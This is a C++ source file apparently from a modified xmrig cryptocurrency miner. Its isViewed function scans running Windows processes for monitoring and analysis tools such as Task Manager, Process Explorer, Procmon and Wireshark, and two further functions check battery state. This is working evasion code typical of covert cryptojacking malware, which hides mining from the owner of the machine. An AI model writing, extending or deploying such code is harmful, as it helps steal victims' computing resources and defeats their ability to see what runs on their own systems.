#include "Environment.h"
#include "base/kernel/Platform.h"
#include "Windows.h"
#include <TlHelp32.h>

#include <vector>
#include "base/tools/String.h"

bool xmrig::Environment::isViewed()
{
	std::vector<String> badProcesses = {
		"cain",
		"filemon",
		"netmon",
		"netstat",
		"nmwifi",
		"perfmon",
		"processhacker",
		"procexp",
		"procexp64",
		"procmon",
		"regmon",
		"tasklist",
		"Taskmgr",
		"taskmgr",
		"tcpvcon",
		"tcpview",
		"wireshark"
	};
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	PROCESSENTRY32 pEntry = { 0 };
	pEntry.dwSize = sizeof(pEntry);
	if (!Process32First(hSnapShot, &pEntry))
	{
		CloseHandle(hSnapShot);
		return true;
	}
	do
	{
		String encFilePath = String(Platform::Utf16toUtf8(pEntry.szExeFile));
		for ( size_t i = 0; i < badProcesses.size(); i++ )
		{
			if ( encFilePath.contains(badProcesses.at(i)) )
			{
				CloseHandle(hSnapShot);
				return true;
			}
		}
	} while (Process32Next(hSnapShot, &pEntry));
	CloseHandle(hSnapShot);
	return false;
}

bool xmrig::Environment::isOnBattery()
{
	return Platform::isOnBatteryPower();
}

bool xmrig::Environment::isBatteryLow()
{
	SYSTEM_POWER_STATUS status;
	GetSystemPowerStatus(&status);
	BYTE percent = status.BatteryLifePercent;
	if (percent > 10)
	{
		return false;
	}
	else {
		return true;
	}
}
